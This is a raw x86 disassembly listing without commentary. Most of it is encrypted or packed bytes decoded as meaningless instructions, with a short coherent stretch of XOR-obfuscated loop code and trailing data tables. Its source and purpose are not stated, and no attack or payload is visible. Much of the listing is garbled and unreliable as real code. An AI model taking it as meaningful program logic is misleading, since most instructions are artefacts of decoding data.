  420806:	mov    eax,ds:0xb8322fc6
  42080b:	int3   
  42080c:	and    eax,edx
  42080e:	and    DWORD PTR [edi-0x3b74bc73],edi
  420814:	dec    ebx
  420815:	xor    esp,DWORD PTR [edi+ebx*4+0x34]
  420819:	xchg   DWORD PTR [ebx],esi
  42081b:	jmp    0x420808
  42081d:	pop    eax
  42081e:	xor    BYTE PTR [ebx-0x14],cl
  420821:	or     DWORD PTR [ecx+0x49d3568d],esp
  420827:	mov    dh,BYTE PTR [edi-0x32]
  42082a:	nop
  42082b:	dec    eax
  42082c:	nop
  42082d:	mov    esi,0xdb01bb11
  420832:	sbb    BYTE PTR [eax+0x16],bl
  420835:	xchg   ebx,eax
  420836:	cmp    al,0xd7
  420838:	fs jne 0x4207fb
  42083b:	int    0x67
  42083d:	sub    bh,BYTE PTR [edi]
  42083f:	push   eax
  420840:	arpl   WORD PTR [ebp+0x54],cx
  420843:	jno    0x420869
  420845:	(bad)  
  420846:	lea    ebx,ds:0x1b34c818
  42084c:	mov    ds:0xb8426252,al
  420851:	push   ebp
  420852:	jge    0x4208c6
  420854:	test   DWORD PTR [ebp-0x2d],0xc2c8f304
  42085b:	stos   BYTE PTR es:[edi],al
  42085c:	enter  0x8b05,0x2b
  420860:	jecxz  0x4207eb
  420862:	stc    
  420863:	dec    ebx
  420864:	pop    es
  420865:	lock jno 0x42089a
  420868:	out    0xfc,eax
  42086a:	adc    ecx,DWORD PTR [ecx-0x71908a99]
  420870:	pushf  
  420871:	ins    BYTE PTR es:[edi],dx
  420872:	shl    DWORD PTR ds:0x5f207d6b,cl
  420878:	bound  ebx,QWORD PTR [esi]
  42087a:	outs   dx,DWORD PTR ds:[esi]
  42087b:	sub    ch,BYTE PTR [edi+0x5ac27326]
  420881:	jle    0x4208ab
  420883:	sub    DWORD PTR [ebp+ebx*1+0x6b3e3712],edx
  42088a:	jp     0x420843
  42088c:	and    al,0xc5
  42088e:	repz inc esi
  420890:	pop    es
  420891:	fisttp QWORD PTR [ecx+0x5a]
  420894:	push   esi
  420895:	push   ecx
  420896:	push   ss
  420897:	and    bl,ch
  420899:	and    DWORD PTR [edx],ecx
  42089b:	push   ds
  42089c:	pop    ss
  42089d:	pop    ebp
  42089e:	mov    dl,0xdf
  4208a0:	or     esp,DWORD PTR [edi+0xf]
  4208a3:	nop
  4208a4:	and    BYTE PTR [ecx+eax*2+0x7c],cl
  4208a8:	inc    ebx
  4208a9:	out    dx,al
  4208aa:	addr16 mov eax,ds:0x42fc
  4208ae:	mov    edi,DWORD PTR [eax]
  4208b0:	arpl   dx,si
  4208b2:	mov    esi,0x94c8bfd6
  4208b7:	mov    bl,BYTE PTR es:[edi+ebx*4-0x4c]
  4208bc:	sar    edx,0x5a
  4208bf:	outs   dx,DWORD PTR ds:[esi]
  4208c0:	test   eax,0x6e360a9f
  4208c5:	inc    esp
  4208c6:	cmp    ch,BYTE PTR [edx-0x5703cabc]
  4208cc:	or     esi,DWORD PTR [ebx]
  4208ce:	xor    eax,DWORD PTR [ebx]
  4208d0:	int3   
  4208d1:	sbb    eax,0x22e8bc42
  4208d6:	mov    eax,0xaaabfcff
  4208db:	push   ebp
  4208dc:	add    BYTE PTR [ebx-0x5d],cl
  4208df:	sbb    al,0x4
  4208e1:	jge    0x42086a
  4208e3:	cmc    
  4208e4:	adc    al,0xce
  4208e6:	and    al,0x6c
  4208e8:	push   ebp
  4208e9:	mov    ah,0x96
  4208eb:	jo     0x4208dc
  4208ed:	arpl   WORD PTR [ebx-0x5],si
  4208f0:	stc    
  4208f1:	loopne 0x4208b0
  4208f3:	push   ebx
  4208f4:	mov    ds:0xc5ba1c7d,al
  4208f9:	mov    ds:0x3a1af20f,eax
  4208fe:	add    cl,0x9
  420901:	add    ch,BYTE PTR [eax]
  420903:	sbb    DWORD PTR ss:[eax+0x7d],ebp
  420907:	fiadd  WORD PTR [ebp-0x4689f08a]
  42090d:	jp     0x42097a
  42090f:	pop    es
  420910:	ret    0xa213
  420913:	pop    ds
  420914:	pop    ebx
  420915:	fdiv   DWORD PTR [ebx-0xa680dee]
  42091b:	push   0xffffff98
  42091d:	test   BYTE PTR [ebx+0x42340ea7],0xa0
  420924:	xchg   ebx,eax
  420925:	bound  ebx,QWORD PTR [edx]
  420927:	xor    DWORD PTR [eax+ecx*4+0x6c3c5bb8],edi
  42092e:	jge    0x4209ab
  420930:	dec    esp
  420931:	(bad)  [esp+ebp*4+0x12]
  420935:	jg     0x420913
  420937:	sub    eax,0x941f79fb
  42093c:	pop    ebp
  42093d:	popa   
  42093e:	test   BYTE PTR [esi+0x7cf305f],bl
  420944:	repnz cdq 
  420946:	or     al,0xe0
  420948:	and    al,0xfe
  42094a:	fstp   QWORD PTR ss:0x9ca92983
  420951:	sub    DWORD PTR [ecx-0x659a8a97],eax
  420957:	pushf  
  420958:	mov    al,es:0xb38153b0
  42095e:	inc    ecx
  42095f:	dec    DWORD PTR cs:[ebx-0x3b6b22be]
  420966:	cld    
  420967:	outs   dx,BYTE PTR ds:[esi]
  420968:	adc    ch,BYTE PTR [esi-0x10]
  42096b:	adc    DWORD PTR [esi+0x38],ecx
  42096e:	popa   
  42096f:	test   BYTE PTR fs:[esi-0x32b23c40],ch
  420976:	sbb    DWORD PTR fs:[esi-0x5198c7ee],0xfffffffd
  42097e:	mov    cl,0xf1
  420980:	push   eax
  420981:	lds    esp,FWORD PTR [ecx-0x35ace2e2]
  420987:	in     eax,0x1b
  420989:	nop
  42098a:	fidiv  DWORD PTR [edx-0x4b293015]
  420990:	or     eax,0x86fc4e98
  420995:	sub    eax,0x84310992
  42099a:	es cmp ch,bl
  42099d:	sub    eax,0xa5a7f792
  4209a2:	cmp    BYTE PTR [edi+0x7e],cl
  4209a5:	test   BYTE PTR [edi-0x1e],bh
  4209a8:	(bad)  
  4209a9:	push   eax
  4209aa:	test   eax,0xd4619bcf
  4209af:	js     0x42097f
  4209b1:	and    BYTE PTR [bp+si],ch
  4209b4:	push   cs
  4209b5:	inc    ecx
  4209b6:	lds    esp,FWORD PTR gs:[eax-0x32]
  4209ba:	icebp  
  4209bb:	lock push ecx
  4209bd:	iret   
  4209be:	mov    edi,0x54b3dec9
  4209c3:	(bad)  
  4209c4:	jmp    0x420a07
  4209c6:	(bad)  
  4209c7:	(bad)  
  4209c9:	and    cl,ah
  4209cb:	sahf   
  4209cc:	jecxz  0x4209e4
  4209ce:	mov    dh,0xad
  4209d0:	pop    ebp
  4209d1:	loopne 0x420a45
  4209d3:	fstp   TBYTE PTR [ecx-0x18]
  4209d6:	push   0xac56ba0d
  4209db:	cs test al,0xa6
  4209de:	test   eax,0xe9d48e99
  4209e3:	jle    0x4209c1
  4209e5:	adc    al,0x63
  4209e7:	push   0xfffffff6
  4209e9:	xchg   ecx,eax
  4209ea:	in     eax,0x29
  4209ec:	js     0x4209c9
  4209ee:	pop    ebp
  4209ef:	in     eax,0xe
  4209f1:	or     eax,0x42fff06b
  4209f6:	pop    edi
  4209f7:	mov    edi,0xf130560a
  4209fc:	dec    ebx
  4209fd:	pop    ebx
  4209fe:	out    0x85,al
  420a00:	shrd   edx,edx,cl
  420a03:	cli    
  420a04:	in     eax,0x55
  420a06:	aad    0x32
  420a08:	push   es
  420a09:	push   esp
  420a0a:	pop    ecx
  420a0b:	(bad)  
  420a0c:	rcl    BYTE PTR [ebx-0x64],0xe4
  420a10:	push   ecx
  420a11:	es or  edx,edx
  420a14:	mov    dl,0xc6
  420a16:	pop    esi
  420a17:	call   0xad488819
  420a1c:	jo     0x4209dc
  420a1e:	lock pop ebp
  420a20:	jne    0x4209d5
  420a22:	sub    al,0xa2
  420a24:	ret    0x893f
  420a27:	or     ecx,ebp
  420a29:	push   ds
  420a2a:	fcom   st(4)
  420a2c:	stos   DWORD PTR es:[edi],eax
  420a2d:	jge    0x420a1c
  420a2f:	inc    ebp
  420a30:	jno    0x4209cc
  420a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a33:	add    eax,DWORD PTR [ecx-0x4a3ee1fb]
  420a39:	or     eax,0x546e6533
  420a3e:	ret    
  420a3f:	mov    bh,dh
  420a41:	jge    0x4209e3
  420a43:	and    BYTE PTR [esi-0x39],0x75
  420a47:	mov    eax,0x53dd15ad
  420a4c:	xchg   ebp,eax
  420a4d:	jmp    0x4209d1
  420a4f:	dec    edx
  420a50:	push   ebp
  420a51:	xchg   ebx,eax
  420a53:	pop    ebx
  420a54:	xor    esp,edi
  420a56:	pop    esp
  420a57:	rol    BYTE PTR [eax+0x16],1
  420a5a:	and    dh,ch
  420a5c:	ins    BYTE PTR es:[edi],dx
  420a5d:	and    edx,DWORD PTR [eax+0x47fa7209]
  420a63:	mov    WORD PTR [edi-0x27fa16ba],gs
  420a69:	fistp  DWORD PTR [ecx+0x23]
  420a6c:	aad    0xf2
  420a6e:	jl     0x420ab2
  420a70:	lods   eax,DWORD PTR ds:[esi]
  420a72:	xlat   BYTE PTR ds:[ebx]
  420a73:	(bad)  
  420a74:	in     al,dx
  420a75:	rcl    BYTE PTR [ebx+ecx*8],0x11
  420a79:	xchg   DWORD PTR [ecx+edx*1-0x7741e42],ebx
  420a80:	push   ss
  420a81:	imul   esi,DWORD PTR [ebx-0x2a98e9b],0xbdf219bd
  420a8b:	sub    al,0x37
  420a8d:	cli    
  420a8e:	jp     0x420ab2
  420a90:	xor    eax,0x76882494
  420a95:	push   0xffffffbc
  420a97:	js     0x420aab
  420a99:	lea    esi,[ebx]
  420a9b:	cmp    BYTE PTR [ecx],bl
  420a9d:	adc    dl,BYTE PTR [edx+0x5a97acaf]
  420aa3:	mov    dh,0x22
  420aa5:	out    0x30,al
  420aa7:	fst    QWORD PTR [edx-0x7bfc492d]
  420aad:	or     eax,0xb28de22a
  420ab2:	leave  
  420ab3:	ss sub eax,0x8546e24
  420ab9:	adc    eax,0x6bcb5bb7
  420abe:	std    
  420abf:	jge    0x420a54
  420ac1:	(bad)  
  420ac2:	sbb    eax,0xdf0964e0
  420ac7:	and    bl,dh
  420ac9:	test   BYTE PTR ss:[ebp+0x62],ah
  420acd:	adc    dh,BYTE PTR [ecx+eiz*4]
  420ad0:	bound  edx,QWORD PTR [esi+0x182bc0eb]
  420ad6:	das    
  420ad7:	aaa    
  420ad8:	push   ebp
  420ad9:	pop    edx
  420ada:	mov    dh,0xd3
  420adc:	jle    0x420b2b
  420ade:	ss sbb al,0x51
  420ae1:	xor    ch,BYTE PTR [edx+0x3d5370fc]
  420ae7:	pop    ebx
  420ae8:	pop    esi
  420ae9:	and    eax,0x2b99a86c
  420aee:	xchg   ecx,eax
  420aef:	inc    edx
  420af0:	mov    ds,WORD PTR [edi]
  420af2:	pop    eax
  420af3:	sub    al,0xc5
  420af5:	sahf   
  420af6:	pop    esp
  420af7:	retf   
  420af8:	pop    ecx
  420af9:	loope  0x420b5e
  420afb:	jns    0x420ac3
  420afd:	push   ecx
  420afe:	arpl   WORD PTR [esi-0x8],si
  420b01:	push   0x68
  420b03:	pop    edi
  420b04:	add    bh,ah
  420b06:	mov    ebp,0x1e45548
  420b0b:	test   al,0x88
  420b0d:	imul   ebp,ebx,0xffffff97
  420b10:	xchg   edx,eax
  420b11:	fadd   st,st(0)
  420b13:	ret    
  420b14:	push   0x3eea07ae
  420b19:	and    DWORD PTR [edi+esi*8],ecx
  420b1c:	shl    BYTE PTR [esi+0x61a0f701],0xea
  420b23:	sbb    BYTE PTR cs:[ecx-0x8],dh
  420b27:	pop    ecx
  420b28:	leave  
  420b29:	sbb    BYTE PTR [edi],dh
  420b2b:	pushf  
  420b2c:	xor    eax,0xaa9b4b04
  420b31:	fist   WORD PTR [edi]
  420b33:	jg     0x420b95
  420b35:	cli    
  420b36:	sub    al,0x1e
  420b38:	pop    es
  420b39:	and    al,0x64
  420b3b:	pop    eax
  420b3c:	jmp    0x420bb1
  420b3e:	es cwde 
  420b40:	ror    al,cl
  420b42:	das    
  420b43:	cwde   
  420b44:	mov    eax,ds:0xdd9bf2e
  420b49:	ins    DWORD PTR es:[edi],dx
  420b4a:	sub    BYTE PTR [esp+ecx*1],cl
  420b4d:	pusha  
  420b4e:	pop    es
  420b4f:	adc    dh,BYTE PTR [esi+0x1a]
  420b52:	xchg   ecx,eax
  420b53:	fcomp  DWORD PTR [esp]
  420b56:	adc    bh,BYTE PTR [eax+eax*8+0x399678f0]
  420b5d:	leave  
  420b5e:	mov    esp,0x7f1e8ebc
  420b63:	pop    es
  420b64:	and    ch,BYTE PTR [esi+0x8]
  420b67:	and    ah,bl
  420b69:	idiv   BYTE PTR [edi+ebx*4+0x124fc470]
  420b70:	push   ds
  420b71:	div    DWORD PTR [ebp+0x516f615f]
  420b77:	hlt    
  420b78:	nop
  420b79:	out    dx,al
  420b7a:	mov    ebx,0x49965865
  420b7f:	loope  0x420b34
  420b81:	adc    BYTE PTR [edx-0xdb71258],ah
  420b87:	lahf   
  420b88:	fldcw  WORD PTR [edx-0x2e]
  420b8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b8c:	ds jnp 0x420b8c
  420b8f:	pop    ebx
  420b90:	push   es
  420b91:	(bad)  
  420b92:	jecxz  0x420b8f
  420b94:	lahf   
  420b95:	test   DWORD PTR [esi+0x4c70d850],edi
  420b9b:	ins    BYTE PTR es:[edi],dx
  420b9c:	inc    esp
  420b9d:	cmp    eax,0x46299b59
  420ba2:	lods   eax,DWORD PTR ds:[esi]
  420ba3:	adc    BYTE PTR [edi],al
  420ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ba6:	rcl    DWORD PTR [ebp-0x2c],0x13
  420baa:	xchg   esp,eax
  420bab:	(bad)  [esi+eiz*2]
  420bae:	mov    ds:0x74a57d3c,al
  420bb3:	jl     0x420b65
  420bb5:	jmp    0xdc02:0x4344fd5e
  420bbc:	cmp    ebp,DWORD PTR ds:0x43a8b3d4
  420bc2:	jmp    0x420c2b
  420bc4:	(bad)  
  420bc5:	xlat   BYTE PTR ds:[ebx]
  420bc6:	jno    0x420b9b
  420bc8:	adc    dh,BYTE PTR ss:[ecx-0x3c]
  420bcc:	push   cs
  420bcd:	mov    bh,0x2d
  420bcf:	sub    edi,DWORD PTR [eax]
  420bd1:	dec    esp
  420bd2:	inc    edi
  420bd3:	dec    edx
  420bd4:	lods   al,BYTE PTR ds:[esi]
  420bd5:	lds    esi,FWORD PTR [ebp-0x6]
  420bd8:	sub    eax,0xb3f1e632
  420bdd:	jp     0x420be7
  420bdf:	cmp    esp,DWORD PTR [esi]
  420be1:	out    0x17,eax
  420be3:	jge    0x420c31
  420be5:	adc    bh,BYTE PTR [edx-0x62]
  420be8:	lods   al,BYTE PTR ds:[esi]
  420be9:	mov    al,0xbf
  420beb:	int    0x9
  420bed:	pop    es
  420bee:	pop    eax
  420bef:	loop   0x420b7f
  420bf1:	cdq    
  420bf2:	mov    al,ds:0xf9c2f271
  420bf7:	pop    ebp
  420bf8:	cs push ss
  420bfa:	and    ah,dl
  420bfc:	ins    DWORD PTR es:[edi],dx
  420bfd:	mov    ebx,0x993a9801
  420c02:	push   cs
  420c03:	inc    edi
  420c04:	or     al,0x48
  420c06:	js     0x420be9
  420c08:	call   0x22adce65
  420c0d:	into   
  420c0e:	jno    0x420c37
  420c10:	cmp    DWORD PTR [ecx+0x625f58bd],edi
  420c16:	jp     0x420bdb
  420c18:	outs   dx,DWORD PTR ds:[esi]
  420c19:	scas   eax,DWORD PTR es:[edi]
  420c1a:	dec    eax
  420c1b:	pop    esp
  420c1c:	fsubrp st(7),st
  420c1e:	mov    esp,edx
  420c20:	bound  eax,QWORD PTR [eax-0x40ad9bf9]
  420c26:	sbb    al,0xae
  420c28:	ret    
  420c29:	sub    ah,BYTE PTR [edx]
  420c2b:	mov    esp,0x8ec66f95
  420c30:	pop    esi
  420c31:	test   BYTE PTR [ebx+0x6e693d20],cl
  420c37:	jmp    DWORD PTR [eax+0x2d]
  420c3a:	xchg   DWORD PTR [eax+0x510d0bc6],edi
  420c40:	push   ss
  420c41:	mul    BYTE PTR [esi]
  420c43:	xchg   BYTE PTR [eax-0x5c],dl
  420c46:	lds    ebx,FWORD PTR [ecx+0xc]
  420c49:	sub    BYTE PTR cs:[edx+0xa21f50f],dh
  420c50:	inc    ebp
  420c51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c52:	mov    esp,0xba69be7c
  420c57:	leave  
  420c58:	jecxz  0x420cb1
  420c5a:	cld    
  420c5b:	daa    
  420c5c:	mov    esp,0xdd1acc6b
  420c61:	mov    esi,0xc5d99ad0
  420c66:	fnstcw WORD PTR [edx]
  420c68:	xlat   BYTE PTR ds:[ebx]
  420c69:	or     bh,BYTE PTR [edi-0x1d]
  420c6c:	pop    ss
  420c6d:	fisubr WORD PTR [ebx+ecx*2-0x2e]
  420c71:	xchg   edi,eax
  420c72:	add    eax,0xe2989175
  420c77:	mov    cl,BYTE PTR [ecx+0x6]
  420c7a:	adc    esi,DWORD PTR [edi-0x1cc9f88]
  420c80:	ss push esp
  420c82:	stos   DWORD PTR es:[edi],eax
  420c83:	aaa    
  420c84:	jmp    0x420ca6
  420c86:	pop    edi
  420c87:	mov    DWORD PTR [esi+edx*1-0x7e9d75b4],ecx
  420c8e:	ss mov dl,0x4
  420c91:	mov    esi,0xb6ee4b33
  420c96:	and    DWORD PTR [edx-0x1f],ebp
  420c99:	pop    esi
  420c9a:	lods   eax,DWORD PTR ds:[esi]
  420c9b:	cmc    
  420c9c:	ss ret 
  420c9e:	fs scas eax,DWORD PTR es:[di]
  420ca1:	or     cl,BYTE PTR [edi+0x17edb4a7]
  420ca7:	aas    
  420ca8:	push   es
  420ca9:	or     ecx,0xffffff90
  420cac:	jg     0x420cf4
  420cae:	push   0xd169c42f
  420cb3:	push   esp
  420cb4:	and    cl,cl
  420cb6:	push   edx
  420cb7:	xchg   DWORD PTR [edx+0x2],esp
  420cba:	test   eax,0xc206f475
  420cbf:	imul   esi,eax,0xd5321e43
  420cc5:	xchg   ebp,eax
  420cc6:	retf   0xc530
  420cc9:	les    edi,FWORD PTR gs:[ebx-0x39]
  420ccd:	mov    ecx,0xe21a6344
  420cd2:	xor    BYTE PTR [edi],dh
  420cd4:	cwde   
  420cd5:	pop    eax
  420cd6:	xor    cl,bh
  420cd8:	test   DWORD PTR [ecx+0x7b055c74],eax
  420cde:	mov    cl,0xc7
  420ce0:	movhps QWORD PTR [eax+0x51d9d5ad],xmm6
  420ce7:	mov    al,0x6
  420ce9:	ret    
  420cea:	adc    ebx,DWORD PTR [edx-0x65]
  420ced:	xchg   ebx,eax
  420cee:	xor    DWORD PTR [edx],edx
  420cf0:	cmp    eax,0xe9b9bbfa
  420cf5:	aas    
  420cf6:	shl    DWORD PTR [ecx+ebx*4+0x3d],cl
  420cfa:	and    DWORD PTR [edi+eax*8],0xf5399e6d
  420d01:	int3   
  420d02:	add    ebx,DWORD PTR [edx+ecx*1-0x1d]
  420d06:	cmc    
  420d07:	imul   eax,DWORD PTR [edx],0x7c299e4
  420d0d:	inc    esi
  420d0e:	cld    
  420d0f:	mov    gs,ecx
  420d11:	dec    ecx
  420d12:	jge    0x420cb6
  420d14:	cli    
  420d15:	xor    BYTE PTR [ebx],dh
  420d17:	sti    
  420d18:	mov    DWORD PTR [edx],edi
  420d1a:	mov    edx,DWORD PTR [ebp+0x8]
  420d1d:	xor    edx,eax
  420d1f:	inc    ecx
  420d20:	inc    DWORD PTR [ebp-0x18]
  420d23:	add    edx,esi
  420d25:	cmp    ecx,edx
  420d27:	jb     0x41e963
  420d2d:	jmp    0x420d77
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	mov    DWORD PTR [ebp+0x8],ecx
  420d38:	jmp    0x420d6a
  420d3d:	mov    ecx,DWORD PTR [ebp+0x8]
  420d40:	mov    edx,DWORD PTR [ebp-0x8]
  420d43:	xor    ecx,eax
  420d45:	xor    edx,eax
  420d47:	sub    ecx,edx
  420d49:	sub    ecx,esi
  420d4b:	xor    ecx,eax
  420d4d:	mov    DWORD PTR [ebp+0x8],ecx
  420d50:	mov    ecx,DWORD PTR [ebp+0x8]
  420d53:	mov    edx,DWORD PTR [ebp+0x8]
  420d56:	imul   edx,edx,0x5708f2
  420d5c:	xor    ecx,eax
  420d5e:	add    ecx,esi
  420d60:	lea    ecx,[ebp+ecx*4-0x64]
  420d64:	mov    edi,DWORD PTR [ecx]
  420d66:	add    edx,edi
  420d68:	mov    DWORD PTR [ecx],edx
  420d6a:	mov    ecx,DWORD PTR [ebp+0x8]
  420d6d:	xor    ecx,eax
  420d6f:	add    ecx,esi
  420d71:	jne    0x420d3d
  420d77:	mov    ecx,DWORD PTR [ebp-0xc]
  420d7a:	mov    DWORD PTR [ebp+0x8],ecx
  420d7d:	jmp    0x420daf
  420d82:	mov    ecx,DWORD PTR [ebp+0x8]
  420d85:	mov    edx,DWORD PTR [ebp-0x8]
  420d88:	xor    ecx,eax
  420d8a:	xor    edx,eax
  420d8c:	sub    ecx,edx
  420d8e:	sub    ecx,esi
  420d90:	xor    ecx,eax
  420d92:	mov    DWORD PTR [ebp+0x8],ecx
  420d95:	mov    ecx,DWORD PTR [ebp+0x8]
  420d98:	mov    edx,DWORD PTR [ebp+0x8]
  420d9b:	imul   edx,edx,0x5708f2
  420da1:	xor    ecx,eax
  420da3:	add    ecx,esi
  420da5:	lea    ecx,[ebp+ecx*4-0x64]
  420da9:	mov    edi,DWORD PTR [ecx]
  420dab:	add    edx,edi
  420dad:	mov    DWORD PTR [ecx],edx
  420daf:	mov    ecx,DWORD PTR [ebp+0x8]
  420db2:	xor    ecx,eax
  420db4:	add    ecx,esi
  420db6:	jne    0x420d82
  420dbc:	mov    ecx,DWORD PTR [ebp-0x8]
  420dbf:	mov    edx,DWORD PTR [ebp-0x20]
  420dc2:	xor    ecx,eax
  420dc4:	lea    ecx,[ecx+edx*1+0x3272dd]
  420dcb:	mov    DWORD PTR [ebp-0x20],ecx
  420dce:	inc    DWORD PTR [ebp+0xc]
  420dd1:	mov    ecx,DWORD PTR [ebp-0x1c]
  420dd4:	xor    ecx,eax
  420dd6:	add    ecx,esi
  420dd8:	jne    0x413678
  420dde:	jmp    0x420e67
  420de3:	mov    ecx,DWORD PTR [ebp-0xc]
  420de6:	mov    DWORD PTR [ebp+0x8],ecx
  420de9:	jmp    0x420e1b
  420dee:	mov    ecx,DWORD PTR [ebp+0x8]
  420df1:	mov    edx,DWORD PTR [ebp-0x8]
  420df4:	xor    ecx,eax
  420df6:	xor    edx,eax
  420df8:	sub    ecx,edx
  420dfa:	sub    ecx,esi
  420dfc:	xor    ecx,eax
  420dfe:	mov    DWORD PTR [ebp+0x8],ecx
  420e01:	mov    ecx,DWORD PTR [ebp+0x8]
  420e04:	mov    edx,DWORD PTR [ebp+0x8]
  420e07:	imul   edx,edx,0x5708f2
  420e0d:	xor    ecx,eax
  420e0f:	add    ecx,esi
  420e11:	lea    ecx,[ebp+ecx*4-0x64]
  420e15:	mov    edi,DWORD PTR [ecx]
  420e17:	add    edx,edi
  420e19:	mov    DWORD PTR [ecx],edx
  420e1b:	mov    ecx,DWORD PTR [ebp+0x8]
  420e1e:	xor    ecx,eax
  420e20:	add    ecx,esi
  420e22:	jne    0x420dee
  420e28:	jmp    0x420e73
  420e2d:	mov    ecx,DWORD PTR [ebp+0x8]
  420e30:	mov    edx,DWORD PTR [ebp-0x8]
  420e33:	xor    ecx,eax
  420e35:	xor    edx,eax
  420e37:	sub    ecx,edx
  420e39:	sub    ecx,esi
  420e3b:	xor    ecx,eax
  420e3d:	mov    DWORD PTR [ebp+0x8],ecx
  420e40:	mov    ecx,DWORD PTR [ebp+0x8]
  420e43:	mov    edx,DWORD PTR [ebp+0x8]
  420e46:	xor    ecx,eax
  420e48:	imul   edx,edx,0x5708f2
  420e4e:	add    ecx,esi
  420e50:	lea    ecx,[ebp+ecx*4-0x64]
  420e54:	mov    edi,DWORD PTR [ecx]
  420e56:	add    edx,edi
  420e58:	mov    DWORD PTR [ecx],edx
  420e5a:	mov    ecx,DWORD PTR [ebp+0x8]
  420e5d:	xor    ecx,eax
  420e5f:	add    ecx,esi
  420e61:	jne    0x420e2d
  420e67:	mov    ecx,DWORD PTR [ebp-0x8]
  420e6a:	xor    ecx,eax
  420e6c:	mov    eax,DWORD PTR [ebp+0x10]
  420e6f:	add    ecx,esi
  420e71:	mov    DWORD PTR [eax],ecx
  420e73:	pop    edi
  420e74:	pop    esi
  420e75:	pop    ebx
  420e76:	leave  
  420e77:	ret    0xc
  420e7a:	dec    ebp
  420e7b:	and    eax,0x55210010
  420e80:	adc    BYTE PTR [eax],al
  420e82:	call   DWORD PTR [ebp+0x10]
  420e85:	add    bh,al
  420e87:	adc    BYTE PTR ss:[eax],al
  420e8a:	cld    
  420e8b:	ins    BYTE PTR es:[edi],dx
  420e8c:	adc    BYTE PTR [eax],al
  420e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e8f:	js     0x420ea1
  420e91:	add    BYTE PTR [ebx+eiz*2],al
  420e94:	adc    BYTE PTR [eax],al
  420e96:	dec    edi
  420e97:	jae    0x420ea9
  420e99:	add    ah,bl
  420e9b:	sub    eax,0x6ed60010
  420ea0:	adc    BYTE PTR [eax],al
  420ea2:	cmp    BYTE PTR [ecx],al
  420ea4:	adc    BYTE PTR [eax],al
  420ea6:	cwde   
  420ea7:	cmovb  eax,DWORD PTR [eax]
  420eaa:	pushf  
  420eab:	cmovb  eax,DWORD PTR [eax]
  420eae:	mov    al,ds:0xa400420f
  420eb3:	cmovb  eax,DWORD PTR [eax]
  420eb6:	test   al,0xf
  420eb8:	inc    edx
  420eb9:	add    BYTE PTR [edi+ecx*1+0xfb00042],ch
  420ec0:	inc    edx
  420ec1:	add    BYTE PTR [edi+ecx*1+0x42],dh
	...
  420ed4:	dec    edx
  420ed5:	aam    0xb3
  420ed7:	dec    ebp
  420ed8:	add    BYTE PTR [eax],al
  420eda:	add    BYTE PTR [eax],al
  420edc:	add    al,BYTE PTR [eax]
  420ede:	add    BYTE PTR [eax],al
  420ee0:	cmp    eax,0xc0000000
  420ee5:	lar    eax,WORD PTR [eax]
  420ee8:	rol    BYTE PTR [ebx],0x2
  420eeb:	add    BYTE PTR [edx+0xe],al
  420eee:	adc    BYTE PTR [eax],al
  420ef0:	pop    esp
  420ef1:	sbb    edx,DWORD PTR [eax]
  420ef3:	add    BYTE PTR [ebx-0x4dffefb0],cl
  420ef9:	sub    eax,0x29930010
  420efe:	adc    BYTE PTR [eax],al
  420f00:	mov    al,ds:0x5900101f
  420f05:	push   ebp
  420f06:	adc    BYTE PTR [eax],al
  420f08:	ret    0x102d
  420f0b:	add    BYTE PTR [edx+0xe],bh
  420f0e:	inc    edx
  420f0f:	add    BYTE PTR [esi+0xe],bh
  420f12:	inc    edx
  420f13:	add    BYTE PTR [edx-0x79ffbdf2],al
  420f19:	push   cs
  420f1a:	inc    edx
  420f1b:	add    BYTE PTR [edx-0x71ffbdf2],cl
  420f21:	push   cs
  420f22:	inc    edx
  420f23:	add    BYTE PTR [edx-0x69ffbdf2],dl
  420f29:	push   cs
  420f2a:	inc    edx
  420f2b:	add    BYTE PTR [edx-0x61ffbdf2],bl
  420f31:	push   cs
  420f32:	inc    edx
  420f33:	add    BYTE PTR [edx+0x5800420e],ah
  420f39:	cmovb  eax,DWORD PTR [eax]
  420f3c:	pop    esp
  420f3d:	cmovb  eax,DWORD PTR [eax]
  420f40:	pusha  
  420f41:	cmovb  eax,DWORD PTR [eax]
  420f44:	cmovb  eax,DWORD PTR fs:[eax]
  420f48:	push   0x6c00420f
  420f4d:	cmovb  eax,DWORD PTR [eax]
  420f50:	jo     0x420f61
  420f52:	inc    edx
  420f53:	add    BYTE PTR [edi+ecx*1+0x42],dh
  420f57:	add    al,cl
  420f59:	cmp    edx,DWORD PTR [eax]
  420f5b:	add    BYTE PTR [ecx+0x25],dh
  420f5e:	adc    BYTE PTR [eax],al
  420f60:	fld    TBYTE PTR [ecx]
  420f62:	adc    BYTE PTR [eax],al
  420f64:	xchg   edi,eax
  420f65:	sub    al,0x10
  420f67:	add    dh,ah
  420f69:	aaa    
  420f6a:	adc    BYTE PTR [eax],al
  420f6c:	and    eax,0xd5001051
  420f71:	xor    dl,BYTE PTR [eax]
  420f73:	add    BYTE PTR [eax-0x13ffefd8],ch
  420f79:	push   cs
  420f7a:	inc    edx
  420f7b:	add    al,dh
  420f7d:	push   cs
  420f7e:	inc    edx
  420f7f:	add    ah,dh
  420f81:	push   cs
  420f82:	inc    edx
  420f83:	add    al,bh
  420f85:	push   cs
  420f86:	inc    edx
  420f87:	add    ah,bh
  420f89:	push   cs
  420f8a:	inc    edx
  420f8b:	add    BYTE PTR [eax],al
  420f8d:	cmovb  eax,DWORD PTR [eax]
  420f90:	add    al,0xf
  420f92:	inc    edx
  420f93:	add    BYTE PTR [eax],cl
  420f95:	cmovb  eax,DWORD PTR [eax]
  420f98:	adc    DWORD PTR [ebp+0x10],ebx
  420f9b:	add    bh,cl
  420f9d:	push   es
  420f9e:	adc    BYTE PTR [eax],al
  420fa0:	xchg   esp,eax
  420fa1:	xor    eax,0x7b780010
  420fa6:	adc    BYTE PTR [eax],al
  420fa8:	stos   BYTE PTR es:[edi],al
  420fa9:	jo     0x420fbb
  420fab:	add    BYTE PTR [eax],ch
  420fad:	inc    esp
  420fae:	adc    BYTE PTR [eax],al
  420fb0:	pop    ebp
  420fb1:	pop    ecx
  420fb2:	adc    BYTE PTR [eax],al
  420fb4:	fild   QWORD PTR [edi]
  420fb6:	adc    BYTE PTR [eax],al
	...
  420fc0:	push   edx
  420fc1:	push   ebx
  420fc2:	inc    esp
